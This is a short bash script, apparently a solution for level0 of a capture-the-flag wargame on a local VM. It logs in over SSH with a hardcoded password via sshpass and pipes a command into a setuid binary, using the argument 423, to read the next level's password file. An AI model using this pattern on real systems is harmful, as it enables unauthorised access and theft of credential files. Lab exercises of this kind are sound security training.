#!/bin/bash

VM_ID='192.168.56.5'
ACTUAL_LEVEL=$(echo "$0" | grep --only --color=never --max-count=1 "level[0-9].sh" | head --lines=1 | grep --only --color=never --max-count=1 '[0-9]' | head --lines=1)

if [ -z "${ACTUAL_LEVEL}" ]; then
    echo "cannot get the level number of the actua level"
    exit 1
fi

act_level_password="level0"

flag=$(sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "cat /home/user/level1/.pass" |  ./level0 423' 2> /dev/null)

echo -e "FLAG:\n${flag}"
